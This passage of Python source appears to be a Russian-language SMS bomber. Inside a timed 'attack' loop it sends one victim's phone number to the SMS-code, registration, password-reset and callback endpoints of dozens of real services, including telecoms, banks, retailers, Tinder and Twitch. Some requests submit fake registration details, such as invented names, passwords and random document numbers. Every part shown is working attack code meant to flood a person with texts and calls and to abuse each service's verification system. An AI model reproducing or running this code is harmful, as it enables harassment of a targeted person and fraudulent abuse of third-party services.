            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:

            requests.post('https://alfalife.cc/auth.php', data={"phone": _phone})
            R = R + 1
            print('[+] Alfalife Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
            R = R + 1
            print('[+] KoronaPay Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://ggbet.ru/api/auth/register-with-phone',
                          data={"phone": "+" + _phone, "login": _email, "password": password, "agreement": "on",
                                "oferta": "on", })
            R = R + 1
            print('[+] GGbet Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.etm.ru/cat/runprog.html',
                          data={"m_phone": _phone, "mode": "sendSms", "syf_prog": "clients-services",
                                "getSysParam": "yes", })
            R = R + 1
            print('[+] ETM Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:

            requests.post('https://thehive.pro/auth/signup', json={"phone": "+" + _phone, })
            R = R + 1
            print('[+] TheLive Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            R = R + 1
            print('[+] MTS Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone})
            R = R + 1
            print('[+] MyGames Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://zoloto585.ru/api/bcard/reg/',
                          json={"name": _name, "surname": _name, "patronymic": _name, "sex": "m",
                                "birthdate": "11.11.1999",
                                "phone": (_phone, "+* (***) ***-**-**"), "email": _email, "city": "Москва", })
            R = R + 1
            print('[+] Zoloto585 Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://kasta.ua/api/v2/login/', data={"phone": _phone})
            R = R + 1
            print('[+] Kasta Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/',
                          data={"RECALL": "Y", "BACK_CALL_PHONE": _phone})
            R = R + 1
            print('[+] Тaxi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:

            requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                          json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email", })
            R = R + 1
            print('[+] Mail.ru Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.creditter.ru/confirm/sms/send',
                          json={"phone": (_phone, "+* (***) ***-**-**"), "type": "register", })
            R = R + 1
            print('[+] Creditter Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.ingos.ru/api/v1/lk/auth/register/fast/step2',
                          headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal"},
                          json={"Birthday": "1986-07-10T07:19:56.276+02:00",
                                "DocIssueDate": "2004-02-05T07:19:56.276+02:00", "DocNumber": randint(500000, 999999),
                                "DocSeries": randint(5000, 9999), "FirstName": _name, "Gender": "M", "LastName": _name,
                                "SecondName": _name, "Phone": _phone, "Email": _email, })
            R = R + 1
            print('[+] Ingos Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://win.1admiralxxx.ru/api/en/register.json',
                          json={"mobile": _phone, "bonus": "signup", "agreement": 1, "currency": "RUB", "submit": 1,
                                "email": "", "lang": "en", })
            R = R + 1
            print('[+] Admiralxxx Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://oauth.av.ru/check-phone', json={"phone": (_phone, "+* (***) ***-**-**")})
            R = R + 1
            print('[+] Av Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            R = R + 1
            print('[+] MTS Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone})
            R = R + 1
            print('[+] City24 Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone})
            R = R + 1
            print('[+] SushiMaster Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
            R = R + 1
            print('[+] MultiPlex Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://3040.com.ua/taxi-ordering', data={"callback-phone": _phone})
            R = R + 1
            print('[+] 3040 Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.niyama.ru/ajax/sendSMS.php',
                          data={"REGISTER[PERSONAL_PHONE]": _phone, "code": "", "sendsms": "Выслать код", })
            R = R + 1
            print('[+] Niyama Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone})
            R = R + 1
            print('[+] VSK Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": _password})
            R = R + 1
            print('[+] EasyPay Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://fix-price.ru/ajax/register_phone_code.php',
                          data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
            R = R + 1
            print('[+] Fix-Price Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://msk.tele2.ru/api/validation/number/' + _phone, json={"sender": "Tele2"})
            R = R + 1
            print('[+] Tele2 Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone})
            R = R + 1
            print('[+] Finam Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://makimaki.ru/system/callback.php',
                          params={"cb_fio": _name, "cb_phone": format(_phone, "+* *** *** ** **")})
            R = R + 1
            print('[+] MakiMaki Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.flipkart.com/api/6/user/signup/status',
                          headers={"Origin": "https://www.flipkart.com",
                                   "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0FKUA/website/41/website/Desktop", },
                          json={"loginId": "+" + _phone, "supportAllStates": True})
            R = R + 1
            print('[+] FlipKart Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone})
            R = R + 1
            print('[+] Online.ua Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cabinet.planetakino.ua/service/sms', params={"phone": _phone})
            R = R + 1
            print('[+] PlanetaKino Was sent!')
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://ontaxi.com.ua/api/v2/web/client',
                          json={"country": _codes[_code].upper(), "phone": _phone, })
            R = R + 1
            print('[+] OnTaxi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            R = R + 1
            print('[+] Iqos Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://smart.space/api/users/request_confirmation_code/',
                          json={"mobile": "+" + _phone, "action": "confirm_mobile"})
            R = R + 1
            print('[+] Smart.Space Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.tarantino-family.com/wp-admin/admin-ajax.php',
                          data={'action': 'ajax_register_user', 'step': '1', 'security_login': '50a8c243f6',
                                'phone': _phone})
            R = R + 1
            print('[+] tarantino-family Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://apteka.ru/_action/auth/getForm/',
                          data={"form[NAME]": "", "form[PERSONAL_GENDER]": "", "form[PERSONAL_BIRTHDAY]": "",
                                "form[EMAIL]": "", "form[LOGIN]": (_phone, "+* (***) ***-**-**"),
                                "form[PASSWORD]": password, "get-new-password": "Получите пароль по SMS",
                                "user_agreement": "on", "personal_data_agreement": "on", "formType": "simple",
                                "utc_offset": "120", })
            R = R + 1
            print('[+] Apteka Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://uklon.com.ua/api/v1/account/code/send',
                          headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": _phone})
            R = R + 1
            print('[+] Uklon Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.ozon.ru/api/composer-api.bx/_action/fastEntry',
                          json={"phone": _phone, "otpId": 0})
            R = R + 1
            print('[+] Ozon Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get('https://requests.service.banki.ru/form/960/submit',
                         params={"callback": "submitCallback", "name": _name, "phone": "+" + _phone, "email": _email,
                                 "gorod": "Москва", "approving_data": "1", })
            R = R + 1
            print('[+] Banki Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
            R = R + 1
            print('[+] IVI Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.moyo.ua/identity/registration',
                          data={"firstname": _name, "phone": _phone, "email": _email})
            R = R + 1
            print('[+] Moyo Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
            R = R + 1
            print('[+] Helsi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"},
                          json={"Phone": _phone, "Type": 1})
            R = R + 1
            print('[+] KinoLend Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://pizzahut.ru/account/password-reset',
                          data={'reset_by': 'phone', 'action_id': 'pass-recovery', 'phone': _phonePizzahut,
                                '_token': '*'})
            R = R + 1
            print('[+] PizzaHut Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
            R = R + 1
            print('[+] Rabota Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
            R = R + 1
            print('[+] Rutube Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Rutube in sent!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            R = R + 1
            print('[+] Citilink Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                          data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
            R = R + 1
            print('[+] Smsint Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get(
                'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
            R = R + 1
            print('[+] oyorooms Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                          params={"pageName": "registerPrivateUserPhoneVerificatio"},
                          data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": "", })
            R = R + 1
            print('[+] MVIDEO Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
                'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone, 'typeKeys': ['Unemployed']}},
                                                              'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
            R = R + 1
            print('[+] newnext Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            R = R + 1
            print('[+] Sunlight Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone,
                                'deliveryOption': 'sms'})
            R = R + 1
            print('[+] alpari Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            R = R + 1
            print('[+] Invitro Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://online.sbis.ru/reg/service/',
                          json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика',
                                'params': {'phone': _phone}, 'id': '1'})
            R = R + 1
            print('[+] Sberbank Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            R = R + 1
            print('[+] MTS Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.delitime.ru/api/v2/signup",
                          data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            R = R + 1
            print('[+] Delitime Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            R = R + 1
            print('[+] ICQ Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                          data={"mode": "request", "phone": "+" + _phone, "phone_permission": "unknown", "stream_id": 0,
                                "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
            R = R + 1
            print('[+] InDriver Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                          data={"password": password, "application": "lkp", "login": "+" + _phone})
            R = R + 1
            print('[+] Invitro Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            R = R + 1
            print('[+] Pmsm Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
            R = R + 1
            print('[+] IVI Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
            R = R + 1
            print('[+] Lenta Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                          json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
            R = R + 1
            print('[+] Mail.ru Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                          params={"pageName": "registerPrivateUserPhoneVerificatio"},
                          data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
            R = R + 1
            print('[+] MVideo Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone})
            R = R + 1
            print('[+] OK Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
            R = R + 1
            print('[+] SMSgorod Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone})
            R = R + 1
            print('[+] Tinder Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',
                          json={"birthday": {"day": 11, "month": 11, "year": 1999},
                                "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                                "password": password, "phone_number": _phone, "username": username})
            R = R + 1
            print('[+] Twitch Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
                          headers={'App-ID': 'cabinet'})
            R = R + 1
            print('[+] CabWiFi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
            R = R + 1
            print('[+] wowworks Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + _phone})
            R = R + 1
            print('[+] Eda.Yandex Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
